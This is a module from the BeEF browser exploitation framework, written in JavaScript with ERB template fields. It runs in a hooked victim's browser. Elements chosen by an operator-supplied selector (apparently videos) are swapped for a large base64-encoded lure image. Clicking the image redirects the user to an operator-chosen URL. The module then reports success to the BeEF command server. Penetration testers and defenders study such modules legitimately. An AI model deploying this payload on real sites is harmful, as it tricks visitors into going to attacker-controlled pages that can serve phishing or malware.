//
// Copyright (c) 2006-2022 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	$j('<%= @jquery_selector %>').each(function(){
		var width = $j(this).css('width');
		var height = $j(this).css('height');
		$j(this).replaceWith('<img src="data:image/png;base64,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" onclick="window.location=\'<%== @url %>\';" />');
	});
	beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Replace video successful");
});
